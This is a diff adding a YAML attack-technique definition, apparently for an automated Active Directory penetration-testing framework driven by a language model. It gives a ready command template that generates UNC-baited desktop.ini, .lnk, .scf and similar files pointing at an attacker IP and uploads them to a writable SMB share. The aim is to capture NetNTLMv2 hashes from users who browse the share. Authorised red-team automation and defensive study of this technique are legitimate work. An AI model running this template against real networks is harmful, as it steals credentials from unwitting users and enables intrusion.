@@ -1,0 +1,33 @@
+name: ntlm_theft_file_drop
+category: ad
+description: Plant UNC-baited files in writable shares to capture NetNTLM from victims
+preconditions:
+- has_cred
+- writable_share_found
+parameters:
+  attacker_ip: from_engagement.attacker_ip
+  share_path: from_engagement.target_share_path
+command_template: ntlm_theft -g all -s {attacker_ip} -f bait && smbclient {share_path}
+  -c 'put bait/*'
+parser: generic_parser
+expected_effects:
+- ntlm_bait_planted
+- netntlmv2_hash_captured
+falsifier:
+  pattern: ACCESS_DENIED|share not writable|denied|put failed
+  timeout: 30
+model_tier: haiku
+mechanism: 'Drop desktop.ini / .url / .lnk / .scf / SettingContent-ms files into a
+  writable
+
+  share. When a victim browses the share, Explorer auto-fetches the embedded UNC
+
+  path, emitting NetNTLMv2 to the attacker''s responder. Effective against frequented
+
+  document shares; catches privileged users who casually browse.
+
+  '
+references:
+  ocd_mindmap: 'Branch 4: NTLM theft via file drops'
+  hacktricks: windows-hardening/ntlm/places-to-steal-ntlm-creds.md
+hacktricks_ref: windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
